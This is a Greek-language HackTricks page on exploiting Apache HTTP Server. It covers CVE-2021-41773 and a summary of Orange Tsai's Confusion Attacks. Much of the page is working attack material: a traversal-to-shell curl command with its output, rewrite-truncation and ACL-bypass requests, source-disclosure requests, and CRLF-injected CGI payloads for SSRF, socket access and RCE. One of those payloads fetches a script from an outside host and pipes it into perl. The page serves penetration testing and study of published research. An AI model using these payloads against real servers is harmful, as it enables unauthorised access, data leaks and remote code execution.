# Apache

{{#include ../../banners/hacktricks-training.md}}

## Εκτελέσιμες επεκτάσεις PHP

Ελέγξτε ποιες επεκτάσεις εκτελεί ο διακομιστής Apache. Για να τις αναζητήσετε, μπορείτε να εκτελέσετε:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
Επίσης, μερικά μέρη όπου μπορείτε να βρείτε αυτή τη διαμόρφωση είναι:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
## Confusion Attack <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

Αυτοί οι τύποι επιθέσεων έχουν εισαχθεί και τεκμηριωθεί [**από την Orange σε αυτή την ανάρτηση του blog**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) και η παρακάτω είναι μια περίληψη. Η επίθεση "σύγχυσης" βασικά εκμεταλλεύεται το πώς οι δεκάδες μονάδες που συνεργάζονται για να δημιουργήσουν έναν Apache δεν λειτουργούν τέλεια συγχρονισμένες και κάνοντάς τες να τροποποιήσουν κάποια απροσδόκητα δεδομένα μπορεί να προκαλέσει μια ευπάθεια σε μια επόμενη μονάδα.

### Filename Confusion

#### Truncation

Η **`mod_rewrite`** θα κόψει το περιεχόμενο του `r->filename` μετά τον χαρακτήρα `?` ([_**modules/mappers/mod_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)). Αυτό δεν είναι εντελώς λάθος καθώς οι περισσότερες μονάδες θα θεωρήσουν το `r->filename` ως URL. Αλλά σε άλλες περιπτώσεις αυτό θα θεωρηθεί ως διαδρομή αρχείου, κάτι που θα προκαλέσει πρόβλημα.

- **Path Truncation**

Είναι δυνατόν να εκμεταλλευτεί κανείς το `mod_rewrite` όπως στο παρακάτω παράδειγμα κανόνα για να αποκτήσει πρόσβαση σε άλλα αρχεία μέσα στο σύστημα αρχείων, αφαιρώντας το τελευταίο μέρος της αναμενόμενης διαδρομής προσθέτοντας απλά ένα `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
# the output of file `/var/user/orange/secret.yml`
```
- **Παραπλανητική Ανάθεση RewriteFlag**

Στον παρακάτω κανόνα επαναγραφής, όσο η διεύθυνση URL τελειώνει σε .php, θα αντιμετωπίζεται και θα εκτελείται ως php. Επομένως, είναι δυνατόν να σταλεί μια διεύθυνση URL που τελειώνει σε .php μετά τον χαρακτήρα `?` ενώ φορτώνεται στον δρόμο ένας διαφορετικός τύπος αρχείου (όπως μια εικόνα) με κακόβουλο php κώδικα μέσα σε αυτό:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACL Bypass**

Είναι δυνατόν να αποκτήσετε πρόσβαση σε αρχεία που ο χρήστης δεν θα έπρεπε να έχει πρόσβαση, ακόμη και αν η πρόσβαση θα έπρεπε να απορριφθεί με ρυθμίσεις όπως:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
Αυτό συμβαίνει επειδή από προεπιλογή το PHP-FPM θα δέχεται URLs που τελειώνουν σε `.php`, όπως το `http://server/admin.php%3Fooo.php` και επειδή το PHP-FPM θα αφαιρεί οτιδήποτε μετά τον χαρακτήρα `?`, το προηγούμενο URL θα επιτρέπει τη φόρτωση του `/admin.php` ακόμη και αν ο προηγούμενος κανόνας το απαγόρευε.

### DocumentRoot Confusion
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
Ένα διασκεδαστικό γεγονός σχετικά με το Apache είναι ότι η προηγούμενη ανακατεύθυνση θα προσπαθήσει να αποκτήσει πρόσβαση στο αρχείο τόσο από το documentRoot όσο και από τη ρίζα. Έτσι, ένα αίτημα προς `https://server/abouth.html` θα ελέγξει για το αρχείο στο `/var/www/html/about.html` και `/about.html` στο σύστημα αρχείων. Αυτό μπορεί βασικά να καταχραστεί για να αποκτήσει πρόσβαση σε αρχεία στο σύστημα αρχείων.

#### **Αποκάλυψη Κώδικα Πηγής Από τον Διακομιστή**

- **Αποκάλυψη Κώδικα Πηγής CGI**

Απλά προσθέτοντας ένα %3F στο τέλος είναι αρκετό για να διαρρεύσει ο κώδικας πηγής ενός cgi module:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
- **Αποκάλυψη Κώδικα Πηγαίου PHP**

Αν ένας διακομιστής έχει διαφορετικά domains με ένα από αυτά να είναι στατικό domain, αυτό μπορεί να εκμεταλλευτεί για να διασχίσει το σύστημα αρχείων και να διαρρεύσει κώδικα php:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Τοπική Manipulation Gadgets**

Το κύριο πρόβλημα με την προηγούμενη επίθεση είναι ότι από προεπιλογή οι περισσότερες προσβάσεις στο σύστημα αρχείων θα απορρίπτονται όπως στην [προκαθορισμένη ρύθμιση](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115) του Apache HTTP Server:
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
Ωστόσο, τα λειτουργικά συστήματα [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) επιτρέπουν από προεπιλογή το `/usr/share`:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Επομένως, θα ήταν δυνατό να **καταχραστούν αρχεία που βρίσκονται μέσα στο `/usr/share` σε αυτές τις διανομές.**

**Τοπική Συσκευή για Αποκάλυψη Πληροφοριών**

- **Apache HTTP Server** με **websocketd** μπορεί να εκθέσει το σενάριο **dump-env.php** στο **/usr/share/doc/websocketd/examples/php/**, το οποίο μπορεί να αποκαλύψει ευαίσθητες μεταβλητές περιβάλλοντος.
- Διακομιστές με **Nginx** ή **Jetty** μπορεί να εκθέσουν ευαίσθητες πληροφορίες εφαρμογών ιστού (π.χ., **web.xml**) μέσω των προεπιλεγμένων ριζών ιστού τους που βρίσκονται κάτω από το **/usr/share**:
- **/usr/share/nginx/html/**
- **/usr/share/jetty9/etc/**
- **/usr/share/jetty9/webapps/**

**Τοπική Συσκευή για XSS**

- Σε Ubuntu Desktop με **LibreOffice εγκατεστημένο**, η εκμετάλλευση της δυνατότητας αλλαγής γλώσσας των αρχείων βοήθειας μπορεί να οδηγήσει σε **Cross-Site Scripting (XSS)**. Η χειραγώγηση της διεύθυνσης URL στο **/usr/share/libreoffice/help/help.html** μπορεί να ανακατευθύνει σε κακόβουλες σελίδες ή παλαιότερες εκδόσεις μέσω **unsafe RewriteRule**.

**Τοπική Συσκευή για LFI**

- Εάν είναι εγκατεστημένα PHP ή ορισμένα πακέτα front-end όπως **JpGraph** ή **jQuery-jFeed**, τα αρχεία τους μπορούν να εκμεταλλευτούν για να διαβάσουν ευαίσθητα αρχεία όπως **/etc/passwd**:
- **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
- **/usr/share/javascript/jquery-jfeed/proxy.php**
- **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Τοπική Συσκευή για SSRF**

- Χρησιμοποιώντας το **MagpieRSS's magpie_debug.php** στο **/usr/share/php/magpierss/scripts/magpie_debug.php**, μπορεί να δημιουργηθεί εύκολα μια ευπάθεια SSRF, παρέχοντας μια πύλη για περαιτέρω εκμεταλλεύσεις.

**Τοπική Συσκευή για RCE**

- Οι ευκαιρίες για **Remote Code Execution (RCE)** είναι πολλές, με ευάλωτες εγκαταστάσεις όπως μια παρωχημένη **PHPUnit** ή **phpLiteAdmin**. Αυτές μπορούν να εκμεταλλευτούν για να εκτελέσουν αυθαίρετο κώδικα, επιδεικνύοντας την εκτενή δυνατότητα χειραγώγησης τοπικών συσκευών.

#### **Jailbreak από Τοπικές Συσκευές**

Είναι επίσης δυνατό να γίνει jailbreak από τους επιτρεπόμενους φακέλους ακολουθώντας τα symlinks που δημιουργούνται από εγκατεστημένο λογισμικό σε αυτούς τους φακέλους, όπως:

- **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
- **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
- **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
- **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
- **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

Επιπλέον, με την καταχρηστική χρήση symlinks ήταν δυνατό να αποκτηθεί **RCE στο Redmine.**

### Handler Confusion <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Αυτή η επίθεση εκμεταλλεύεται την επικάλυψη στη λειτουργικότητα μεταξύ των οδηγιών `AddHandler` και `AddType`, οι οποίες και οι δύο μπορούν να χρησιμοποιηθούν για να **επιτρέψουν την επεξεργασία PHP**. Αρχικά, αυτές οι οδηγίες επηρεάζουν διαφορετικά πεδία (`r->handler` και `r->content_type` αντίστοιχα) στη εσωτερική δομή του διακομιστή. Ωστόσο, λόγω κωδικού κληρονομιάς, ο Apache χειρίζεται αυτές τις οδηγίες εναλλάξ υπό ορισμένες συνθήκες, μετατρέποντας το `r->content_type` σε `r->handler` εάν το πρώτο είναι ρυθμισμένο και το δεύτερο όχι.

Επιπλέον, στον Apache HTTP Server (`server/config.c#L420`), εάν το `r->handler` είναι κενό πριν την εκτέλεση του `ap_run_handler()`, ο διακομιστής **χρησιμοποιεί το `r->content_type` ως handler**, καθιστώντας ουσιαστικά το `AddType` και το `AddHandler` ταυτόσημα σε αποτέλεσμα.

#### **Αντικατάσταση Handler για Αποκάλυψη Κώδικα PHP**

Σε [**αυτή την ομιλία**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf), παρουσιάστηκε μια ευπάθεια όπου ένα λανθασμένο `Content-Length` που αποστέλλεται από έναν πελάτη μπορεί να προκαλέσει τον Apache να επιστρέψει λανθασμένα **τον κώδικα PHP**. Αυτό συνέβη λόγω ενός προβλήματος χειρισμού σφαλμάτων με το ModSecurity και το Apache Portable Runtime (APR), όπου μια διπλή απάντηση οδηγεί στην αντικατάσταση του `r->content_type` σε `text/html`.\
Δεδομένου ότι το ModSecurity δεν χειρίζεται σωστά τις τιμές επιστροφής, θα επιστρέψει τον κώδικα PHP και δεν θα τον ερμηνεύσει.

#### **Αντικατάσταση Handler για XXXX**

TODO: Το Orange δεν έχει αποκαλύψει αυτή την ευπάθεια ακόμα

### **Εκτέλεση Αυθαίρετων Handlers**

Εάν ένας επιτιθέμενος είναι σε θέση να ελέγξει την κεφαλίδα **`Content-Type`** σε μια απάντηση διακομιστή, θα είναι σε θέση να **καλέσει αυθαίρετους χειριστές μονάδας**. Ωστόσο, μέχρι τη στιγμή που ο επιτιθέμενος ελέγχει αυτό, η πλειονότητα της διαδικασίας του αιτήματος θα έχει ολοκληρωθεί. Ωστόσο, είναι δυνατό να **επανεκκινήσει τη διαδικασία αιτήματος εκμεταλλευόμενος την κεφαλίδα `Location`** επειδή εάν η **r**eturned `Status` είναι 200 και η κεφαλίδα `Location` αρχίζει με `/`, η απάντηση θεωρείται ως Server-Side Redirection και θα πρέπει να επεξεργαστεί.

Σύμφωνα με το [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) (προδιαγραφή σχετικά με CGI) στην [Ενότητα 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) ορίζεται μια συμπεριφορά Τοπικής Αντίκτυπης Απόκρισης:

> Το CGI script μπορεί να επιστρέψει μια διαδρομή URI και μια query-string (‘local-pathquery’) για έναν τοπικό πόρο σε ένα πεδίο κεφαλίδας Location. Αυτό υποδεικνύει στον διακομιστή ότι θα πρέπει να επεξεργαστεί ξανά το αίτημα χρησιμοποιώντας τη διαδρομή που καθορίζεται.

Επομένως, για να εκτελεστεί αυτή η επίθεση απαιτείται μία από τις παρακάτω ευπάθειες:

- CRLF Injection στις κεφαλίδες απόκρισης CGI
- SSRF με πλήρη έλεγχο των κεφαλίδων απόκρισης

#### **Αυθαίρετος Handler για Αποκάλυψη Πληροφοριών**

Για παράδειγμα, το `/server-status` θα πρέπει να είναι προσβάσιμο μόνο τοπικά:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
Είναι δυνατόν να αποκτήσετε πρόσβαση ρυθμίζοντας το `Content-Type` σε `server-status` και την κεφαλίδα Location να ξεκινά με `/`
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Αυθαίρετος Χειριστής σε Πλήρη SSRF**

Ανακατεύθυνση στο `mod_proxy` για πρόσβαση σε οποιοδήποτε πρωτόκολλο σε οποιοδήποτε URL:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
Ωστόσο, η κεφαλίδα `X-Forwarded-For` προστίθεται αποτρέποντας την πρόσβαση σε σημεία τερματισμού μεταδεδομένων cloud.

#### **Αυθαίρετος Χειριστής για Πρόσβαση σε Τοπικό Unix Domain Socket**

Πρόσβαση στο τοπικό Unix Domain Socket του PHP-FPM για να εκτελέσετε ένα PHP backdoor που βρίσκεται στο `/tmp/`:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Αυθαίρετος Χειριστής για RCE**

Η επίσημη [PHP Docker](https://hub.docker.com/_/php) εικόνα περιλαμβάνει το PEAR (`Pearcmd.php`), ένα εργαλείο διαχείρισης πακέτων PHP γραμμής εντολών, το οποίο μπορεί να καταχραστεί για να αποκτηθεί RCE:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
Ελέγξτε [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), γραμμένο από [Phith0n](https://x.com/phithon_xg) για τις λεπτομέρειες αυτής της τεχνικής.

## Αναφορές

- [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)

{{#include ../../banners/hacktricks-training.md}}
